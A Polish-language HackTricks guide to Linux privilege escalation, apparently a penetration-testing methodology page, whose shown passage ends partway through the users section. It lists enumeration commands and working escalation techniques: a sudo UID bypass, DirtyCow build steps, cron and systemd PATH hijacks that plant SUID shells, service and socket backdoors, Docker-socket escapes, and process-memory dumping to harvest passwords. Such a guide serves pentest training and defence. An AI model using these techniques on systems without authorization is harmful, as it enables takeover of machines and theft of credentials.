# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o OS

Zacznijmy zdobywać informacje o działającym OS
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Jeżeli **masz uprawnienia do zapisu w dowolnym folderze znajdującym się w zmiennej `PATH`** możesz być w stanie przejąć niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję kernela i czy istnieje exploit, którego można użyć do escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych wersji jądra oraz kilka już dostępnych **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne serwisy, gdzie można znaleźć kilka **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej witryny możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Zawsze **wyszukaj wersję kernel w Google**, być może Twoja wersja kernel jest wymieniona w jakimś kernel exploit i wtedy będziesz pewien, że exploit jest ważny.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja sudo

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego grepa.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Weryfikacja podpisu Dmesg nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład**, jak można wykorzystać tę vuln.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe środki obronne

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli znajdujesz się w docker container możesz spróbować się z niego wydostać:


{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **what is mounted and unmounted**, gdzie i dlaczego. Jeśli coś jest unmounted, możesz spróbować to mount i sprawdzić, czy znajdują się tam prywatne informacje
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaria
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź również, czy **any compiler is installed**. Jest to przydatne, jeśli musisz użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Może istnieć jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Zauważ, że te polecenia wyświetlą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy którakolwiek z zainstalowanych wersji oprogramowania jest podatna na znane exploits_

## Processes

Take a look at **jakie procesy** są uruchomione i sprawdź, czy któryś proces nie ma **więcej uprawnień niż powinien** (może tomcat uruchomiony przez root?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w linii poleceń procesu.\
Również **sprawdź swoje uprawnienia względem binarek procesów**, być może możesz nadpisać którąś z nich.

### Process monitoring

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. To może być bardzo przydatne do identyfikowania podatnych procesów uruchamianych często lub gdy spełniony jest zestaw wymagań.

### Process memory

Niektóre usługi na serwerze zapisują **credentials in clear text inside the memory**.\
Zazwyczaj będziesz potrzebować **root privileges**, aby odczytać pamięć procesów należących do innych użytkowników, dlatego jest to zwykle przydatniejsze, gdy jesteś już root i chcesz odnaleźć więcej credentials.\
Jednak pamiętaj, że **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Zwróć uwagę, że obecnie większość maszyn domyślnie nie pozwala na ptrace, co oznacza, że nie możesz zrzucać pamięci innych procesów należących do nieuprzywilejowanego użytkownika.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, pod warunkiem że mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: tylko proces rodzicielski może być debugowany.
> - **kernel.yama.ptrace_scope = 2**: Tylko admin może używać ptrace, ponieważ wymaga to uprawnienia CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Żadne procesy nie mogą być śledzone przy użyciu ptrace. Po ustawieniu wymagane jest ponowne uruchomienie systemu, aby ponownie włączyć ptrace.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać Heap i przeszukać go pod kątem jej credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu, **maps pokazuje, jak pamięć jest mapowana we wirtualnej przestrzeni adresowej tego procesu**; pokazuje także **uprawnienia każdego zmapowanego regionu**. Pseudoplik **mem** **udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** i ich offsety. Wykorzystujemy te informacje, aby wykonać seek w pliku **mem** i zrzucić wszystkie czytelne regiony do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do **pamięci fizycznej** systemu, a nie pamięci wirtualnej. Przestrzeń adresowa jądra można uzyskać przy użyciu /dev/kmem.\
Zazwyczaj, `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla linux

ProcDump to wersja dla linux klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania root i zrzucić proces należący do Ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli znajdziesz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz zrzucić proces (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby zrzucania pamięci procesu) i wyszukać poświadczenia w pamięci:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie **wykradać poświadczenia w postaci jawnego tekstu z pamięci** oraz z niektórych **znanych plików**. Wymaga uprawnień root, aby działać poprawnie.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)          | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH - użycie sudo)         | sshd:                |

#### Wzorce wyszukiwania/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane zadania/Cron jobs

Sprawdź, czy któreś zaplanowane zadanie jest podatne. Być może możesz wykorzystać skrypt wykonywany przez root (wildcard vuln? można modyfikować pliki, których używa root? użyć symlinks? utworzyć konkretnie pliki w katalogu, którego używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka Cron

Na przykład, w pliku _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik "user" ma uprawnienia zapisu do /home/user_)

Jeśli w tym crontabie użytkownik root spróbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root ma “**\***” wewnątrz polecenia, możesz to wykorzystać do wykonania nieoczekiwanych rzeczy (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, to nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby uzyskać więcej trików dotyczących wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script nadpisywanie i symlink

Jeśli **możesz zmodyfikować cron script** wykonywany przez root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli script uruchamiany przez root używa **katalogu, do którego masz pełny dostęp**, może być przydatne usunięcie tego katalogu i **utworzenie katalogu symlink wskazującego na inny**, który będzie serwował script kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste cron jobs

Możesz monitorować processes, aby wyszukać te, które są uruchamiane co 1, 2 lub 5 minut. Być może możesz to wykorzystać i escalate privileges.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **sort by less executed commands** i usunąć commands, które zostały wykonane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wypisywać każdy proces, który się uruchamia).

### Niewidoczne cron jobs

Można utworzyć cronjob **umieszczając znak CR (carriage return) po komentarzu** (bez znaku nowej linii), a cron job będzie działać. Przykład (zwróć uwagę na znak CR):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Pliki _.service_ możliwe do zapisu

Sprawdź, czy możesz zapisać dowolny plik `.service`; jeśli tak, **możesz go zmodyfikować**, tak aby **uruchamiał** twój **backdoor gdy** usługa jest **uruchomiona**, **zrestartowana** lub **zatrzymana** (może być konieczne poczekanie na ponowne uruchomienie maszyny).\
Na przykład umieść swój backdoor wewnątrz pliku .service używając **`ExecStart=/tmp/script.sh`**

### Pliki binarne usług z prawami zapisu

Miej na uwadze, że jeśli masz **uprawnienia zapisu do binariów uruchamianych przez usługi**, możesz je zmienić, wstawiając backdoors, tak że gdy usługi zostaną ponownie uruchomione, backdoors zostaną wykonane.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli stwierdzisz, że możesz **zapisać** w którymkolwiek z katalogów w ścieżce, możesz być w stanie **escalate privileges**. Musisz szukać **ścieżek względnych używanych w plikach konfiguracyjnych usług**, takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **executable** o **same name as the relative path binary** w folderze systemd PATH, do którego możesz zapisać, a gdy serwis zostanie poproszony o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), Twój **backdoor will be executed** (użytkownicy bez uprawnień zwykle nie mogą startować/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timers**

**Timers** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki `**.service**` lub zdarzenia. **Timers** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń opartych na czasie kalendarzowym oraz monotonicznym i mogą być uruchamiane asynchronicznie.

Możesz wyświetlić wszystkie timers za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi on niektóre istniejące jednostki systemd.unit (takie jak `.service` lub `.target`).
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest Unit:

> Jednostka, którą należy aktywować, gdy ten timer wygaśnie. Argument to nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie określono, ta wartość domyślnie wskazuje na service o tej samej nazwie co timer unit, z wyjątkiem sufiksu. (Zobacz wyżej.) Zaleca się, aby nazwa jednostki, która jest aktywowana, oraz nazwa timer unit były identyczne, z wyjątkiem sufiksu.

Dlatego, aby nadużyć tego uprawnienia, musiałbyś:

- Znaleźć jakiś systemd unit (np. `.service`), który **uruchamia writable binary**
- Znaleźć jakiś systemd unit, który **uruchamia relative path** i nad którym masz **writable privileges** w **systemd PATH** (aby podszyć się pod ten executable)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie Timera**

Aby włączyć timer potrzebujesz uprawnień root i uruchomić:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zauważ, że **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tych samych lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są ustawiane za pomocą plików `.socket`.

Sockets można konfigurować przy użyciu plików `.socket`.

**Dowiedz się więcej o sockets za pomocą `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje się różnią, ale w skrócie służą do **wskazania, gdzie będzie nasłuchiwane** gniazdo (ścieżka pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu do nasłuchiwania itp.)
- `Accept`: Przyjmuje argument typu boolean. Jeśli **true**, dla każdego przychodzącego połączenia **uruchamiany jest osobny egzemplarz service**, a jedynie gniazdo połączenia jest do niego przekazywane. Jeśli **false**, wszystkie gniazda nasłuchujące są **przekazywane do uruchomionej jednostki service**, i tylko jedna jednostka service jest uruchamiana dla wszystkich połączeń. Ta wartość jest ignorowana dla datagram sockets i FIFOs, gdzie jedna jednostka service niezmiennie obsługuje cały przychodzący ruch. **Domyślnie: false**. Ze względów wydajnościowych zaleca się pisać nowe demony w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **sockets**/FIFOs, odpowiednio. Pierwszy token linii poleceń musi być absolutną ścieżką do pliku wykonywalnego, po którym następują argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **sockets**/FIFOs, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **ruchu przychodzącym**. To ustawienie jest dozwolone tylko dla sockets z Accept=no. Domyślnie wskazuje na jednostkę service o tej samej nazwie co socket (z zamienionym sufiksem). W większości przypadków nie powinno być konieczne używanie tej opcji.

### Zapisowalne .socket files

Jeśli znajdziesz **zapisowalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie uruchomiony przed utworzeniem gniazda. W związku z tym **prawdopodobnie będziesz musiał poczekać na restart maszyny.**\
_I pamiętaj, że system musi używać tej konfiguracji pliku socket, inaczej backdoor nie zostanie uruchomiony_

### Zapisowalne gniazda

Jeśli **zidentyfikujesz jakiekolwiek zapisywalne gniazdo** (_mówimy tu o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym gniazdem i być może wykorzystać lukę.

### Enumeracja Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zauważ, że mogą istnieć **sockets listening for HTTP** requests (_I'm not talking about .socket files but the files acting as unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na żądania HTTP**, możesz się z nim **komunikować** i być może **exploit some vulnerability**.

### Zapisalny Docker Socket

Docker socket, często znajdujący się pod `/var/run/docker.sock`, to krytyczny plik, który należy zabezpieczyć. Domyślnie jest zapisywalny przez użytkownika `root` oraz członków grupy `docker`. Posiadanie dostępu zapisu do tego socketu może prowadzić do privilege escalation. Poniżej znajduje się przegląd, jak można to zrobić oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz dostęp zapisu do Docker socket, możesz escalate privileges, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z dostępem root do systemu plików hosta.

#### **Korzystanie bezpośrednio z Docker API**

W przypadkach, gdy Docker CLI nie jest dostępny, do gniazda Docker można nadal uzyskać dostęp za pomocą Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, który zamontuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony kontener:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonywanie poleceń wewnątrz niego.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po nawiązaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z uprawnieniami root do systemu plików hosta.

### Inne

Zauważ, że jeśli masz uprawnienia zapisu do gniazda docker, ponieważ jesteś **inside the group `docker`**, masz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **more ways to break out from docker or abuse it to escalate privileges** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Jeśli stwierdzisz, że możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Jeśli stwierdzisz, że możesz użyć polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom efektywną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny, wspiera podstawową komunikację międzyprocesową, która usprawnia wymianę danych między procesami, przypominając **enhanced UNIX domain sockets**. Ponadto pomaga w rozgłaszaniu zdarzeń lub sygnałów, ułatwiając płynną integrację komponentów systemu. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus obsługuje system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, co upraszcza procesy, które tradycyjnie były skomplikowane.

D-Bus działa w **allow/deny model**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie sumarycznego efektu pasujących reguł polityki. Te polityki określają interakcje z busem, co może potencjalnie umożliwić privilege escalation poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` jest podany, opisując uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy stosuje się uniwersalnie, podczas gdy polityki z kontekstem "default" stosuje się do wszystkich nieobjętych innymi, bardziej szczegółowymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerować i wykorzystywać komunikację D-Bus tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto przeprowadzić enumerację sieci i ustalić pozycję maszyny.

### Ogólna enumeracja
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdź usługi sieciowe działające na maszynie, z którymi nie mogłeś wchodzić w interakcję przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz zdobyć poświadczenia.
```
timeout 1 tcpdump
```
## Użytkownicy

### Generic Enumeration

Sprawdź **who** jesteś, jakie masz **privileges**, którzy **users** są w systemie, którzy mogą **login** i którzy mają **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duży UID

